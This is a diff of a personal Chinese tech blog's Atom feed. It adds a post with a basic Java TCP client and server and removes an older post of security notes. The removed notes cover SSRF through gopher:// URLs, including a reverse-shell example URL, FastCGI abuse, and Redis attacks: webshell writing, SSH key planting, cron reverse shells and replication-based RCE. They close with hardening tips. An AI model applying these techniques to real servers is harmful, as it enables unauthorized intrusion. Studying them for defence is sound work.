@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2023-12-14T11:25:10.246Z</updated>
+  <updated>2023-12-14T12:02:34.102Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Java网络编程</title>
+    <link href="https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
+    <id>https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
+    <published>2023-12-14T11:28:00.000Z</published>
+    <updated>2023-12-14T12:02:34.102Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。</strong><br><a href="https://smms.app/image/Yv5mfec4P3sdFHt" target="_blank"><img src="https://s2.loli.net/2023/12/14/Yv5mfec4P3sdFHt.png" ></a></p><h4 id="TCP通信"><a href="#TCP通信" class="headerlink" title="TCP通信"></a>TCP通信</h4><h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><p>我在正文开头定义了一个：<a name="divtop"></a></p><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) &#123;        ServerSocket serverSocket = null;   //初始化定义为空保证安全        Socket socket = null;        InputStream is = null;        ByteArrayOutputStream baos = null;        try &#123;            //创建ServerSocket对象，监听9999端口            serverSocket = new ServerSocket(9999);            //等待客户端的连接请求，返回一个Socket对象，程序阻塞在此处直到有客户端连接            socket = serverSocket.accept();            //获取输入流，用于读取客户端发送的数据            is = socket.getInputStream();            //创建字节数组输出流，用于存储读取到的数据            baos = new ByteArrayOutputStream();            //预定义缓冲区数组大小，方便存储数据            byte[] buffer = new byte[1024];            int len;            //循环读取客户端发送的数据，将数据存储到字节数组输出流中            while((len = is.read(buffer))!=-1)&#123;                baos.write(buffer,0,len);            &#125;            //将字节数组输出流中的数据转换为字符串并输出到控制台            System.out.println(baos.toString());            //关闭字节数组输出流和输入流            baos.close();            is.close();            //关闭Socket对象和ServerSocket对象            socket.close();            serverSocket.close();        &#125; catch (IOException e)&#123;            e.printStackTrace(); //打印异常信息        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) &#123;        Socket socket = null;   // 用于建立客户端与服务器之间的套接字连接        OutputStream os = null; // 用于向服务器发送数据的输出流        try &#123;            InetAddress serverIP = InetAddress.getByName("127.0.0.1"); // 通过IP地址获取服务器的InetAddress实例            int port = 9999; // 连接服务器的端口号            // 创建套接字连接至服务器            socket = new Socket(serverIP, port);            // 通过套接字获取输出流，用于向服务器发送数据            os = socket.getOutputStream();            // 向服务器发送数据            os.write("Hello, world!".getBytes());        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if (socket != null) &#123;                try &#123;                    socket.close(); // 关闭套接字连接                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们跳转过去：<a href="#divtop">跳转指定位置</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://smms.app/image/Yv5mfec4P3sdFHt&quot; target=&quot;_blank</summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Java多线程</title>
@@ -475,30 +499,6 @@ ps aux | sort -k4nr</summary>
       
       
     <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://smms.app/image/XQtTYJOM86jfR1K&quot; target=&quot;_blank&quot;&gt;&lt;img </summary>
-      
-    
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>协议拓展</title>
-    <link href="https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/"/>
-    <id>https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/</id>
-    <published>2023-07-07T19:03:00.000Z</published>
-    <updated>2023-07-07T20:05:59.821Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br>GOPHER协议是一种比HTTP协议还要古老的协议，默认工作端口70<br>GOPHER协议可以以单个URL的形式传递POST请求，同时支持换行（能换行就有很大操作空间）</p><h4 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h4><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流注意要有一个_，这个符号可以换成任意一个字符</code></pre><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>准备好请求数据</p><pre><code>GET /testg.php?name=xxx HTTP/1.1Host: 10.211.55.2</code></pre><p>用BP全编码</p><pre><code>%47%45%54%20%2f%74%......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%47%45%54%20%2f%74%......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>准备好请求数据</p><pre><code>POST /testg.php HTTP/1.1Host: 10.211.55.2Content-Type: application/x-www-form-urlencodedContent-Length: 8 name=xxx</code></pre><p>用BP全编码</p><pre><code>%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>协议可以几乎无限制地传输各种数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>反弹shell</p><pre><code>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc</code></pre><p><a href="https://gitcode.net/mirrors/tarunkant/Gopherus?utm_source=csdn_github_accelerator">监测及RCE工具</a></p><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>FastCGI协议和HTTP协议一样是通信协议<br>http是浏览器（也就是客户端）和服务器中间件之间通信的协议，而FastCGI协议是服务器中间件和某种语言编写的正在运行的后端程序间的通信协议。<br>它支持分布式的运算，所以 FastCGI 程序可以在网站服务器以外的主机上执行，并且可以接受来自其它网站服务器的请求<br>FastCGI将CGI解释器进程保持在内存中，以此获得较高的性能</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p><a href="https://smms.app/image/oWEr76O4A5hLaJj" target="_blank"><img src="https://s2.loli.net/2023/07/08/oWEr76O4A5hLaJj.png" ></a></p><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP-FPM（fastcgi进程管理器）默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>需要一个php文件，首选/var/www/html/index.php</li><li>然后要在PHP.INI中打开配置项auto_prepend_file和auto_append_file</li><li>接着使用上面说的那个Gopherus工具生成payload</li><li>根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</li><li>Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器</li><li>PHP解析器会解析php.ini文件，然后就执行完一整个工作流程返回数据</li></ol><h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>redis是一个key-value存储系统<br>它对数据支持复杂的操作、支持各种不同方式的排序、为了保证效率数据缓存在内存中<br>redis数据库一种，默认绑定在0.0.0.0:6379，攻击者直接可以访问到<br>默认无密码，登录账户为root</p><h4 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a>存在漏洞</h4><ol><li>未授权访问</li><li>访问敏感文件</li><li>root权限写入webshell</li><li>root权限写入公私钥</li></ol><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>能访问到、能登录、能写入（有root）</p><ol><li>开放在公网，没有和ip绑定，默认无密码</li><li>root权限</li><li>webshell和公私钥匙通信原理</li><li>有可能把redis的默认端口6379修改</li></ol><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><p>Redis默认情况下，会绑定在0.0.0.0:6379<br>如果没有配置非信任来源的IP访问限制，就会将Redis服务暴露在公网上<br>如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据</p><h5 id="Redis写入Webshell"><a href="#Redis写入Webshell" class="headerlink" title="Redis写入Webshell"></a>Redis写入Webshell</h5><p>如果存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限<br>即可通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的</p><h5 id="Redis密钥登录SSH"><a href="#Redis密钥登录SSH" class="headerlink" title="Redis密钥登录SSH"></a>Redis密钥登录SSH</h5><p>redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入时<br>在数据库中插入一条数据，将本机的公钥作为value，key值随意<br>然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys<br>把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p><h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><p>利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 /var/spool/cron下来执行</p><h5 id="远程主从复制RCE"><a href="#远程主从复制RCE" class="headerlink" title="远程主从复制RCE"></a>远程主从复制RCE</h5><p>4.x、5.x版本中，Redis提供了主从模式<br>主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写<br>通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式<br>在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令<br>缺点是如果目标机子只允许本地登录，则这种利用方法就不行了</p><h5 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h5><p>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><p>redis的安全设置：设置完毕，需要重加载配置文件启动redis</p><ol><li>绑定内网ip地址进行访问</li><li>requirepass设置redis密码</li><li>保护模式开启protected-mode开启（默认开启）</li><li>最好把端口更改</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;Gopher协议&quot;&gt;&lt;a href=&quot;#Gopher协议&quot; class=&quot;headerlink&quot; title=&quot;Gopher协议&quot;&gt;&lt;/a&gt;Gopher协议&lt;/h3&gt;&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
       
     
     
